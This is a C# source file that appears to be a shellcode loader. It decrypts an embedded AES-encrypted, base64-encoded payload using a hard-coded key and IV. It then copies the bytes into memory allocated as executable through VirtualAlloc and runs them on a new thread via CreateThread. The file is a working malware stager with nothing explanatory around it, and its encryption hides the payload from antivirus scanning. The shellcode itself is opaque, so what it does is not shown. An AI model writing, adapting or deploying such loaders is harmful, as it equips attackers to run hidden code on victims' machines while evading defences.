using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.IO;

namespace classic
{
    class Program
    {
        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

        [DllImport("kernel32.dll")]
        static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

        [DllImport("kernel32.dll")]
        static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);

        static void Main(string[] args)
        {

            string base64Encrypted = "DxDNayjygmfW/xrAT3dD6upWnKo9duJi+fnQXgsa/1e5U4SJ8CwFfaD2iHGwUG/FwUkhMzhWyGHzR8pGW5UVB4B4+oh/7R01xuzWHhi5JL34LxD9WJ8ewxSaiyOsJG3slnQbHbb2DaR56+hzz41PKtcTG6I+1nwgY8k7wHh2SffL2Ye0ch6w7+4Kl0I4m59z4r9kkT6VTMtFOk16//X7/b6RXKNVw/TO5PaJGbQAsZvALtlsLV9pOV+h4FY6Ga5tLETEHEobfSVE1ke5KRt07EfE+ueFmlQknEtvE6v/l7/B91bpH5DuTnn78LwdeBoLpuo4c1OSvQAnvcr5ApeM0u58bv/qbE8K3hqJGX3VgqpmednU6Mse3fNoFEhrnNWm6ms9bjJre91BbzL7M9UMLKpQBzNdRFZ7UX6F3t2OQkWHsAgBrDA+EzOWaTm9VCVJJ9JEi6w3+7kftDHXwZjbBalZeFG9HFFDK8WnzNstX1z0J90zRnKWqmr3VHHNb+1yPb1iENaujnMc3C82z28gr/nmxAV5Pu7fyMgOf/dTGkgLk095xl/DX9nRBseFPmw6HKL1sZh3Dgv+RlQC02N2F+SEMRWfS6MRgaV1PysfcpINOXWsyy9TCpcYND9isMIXxF5T64kyvs3pahs+MbBAIxlX2aoMgxpUyXWooqXEB1M=";
            string base64Key = "KsOYXT0R78+h+DleH8fWG/Up4l7KBnNBNBLxxSsyU+0=";
            string base64IV = "3DJZjoxYP9ugV4gT+7z8Yw==";
            byte[] encryptedShellcode = Convert.FromBase64String(base64Encrypted);
            byte[] key = Convert.FromBase64String(base64Key);
            byte[] iv = Convert.FromBase64String(base64IV);
            byte[] buf;

            using (Aes aes = Aes.Create())
            {
                aes.KeySize = 256;
                aes.Key = key;
                aes.IV = iv;
                aes.Mode = CipherMode.CBC;
                aes.Padding = PaddingMode.PKCS7;

                ICryptoTransform decryptor = aes.CreateDecryptor();
                buf = decryptor.TransformFinalBlock(encryptedShellcode, 0, encryptedShellcode.Length);
            }

            int size = buf.Length;

            IntPtr addr = VirtualAlloc(IntPtr.Zero, 0x1000, 0x3000, 0x40);

            Marshal.Copy(buf, 0, addr, size);

            IntPtr hThread = CreateThread(IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);

            WaitForSingleObject(hThread, 0xFFFFFFFF);

        }

            }
        }
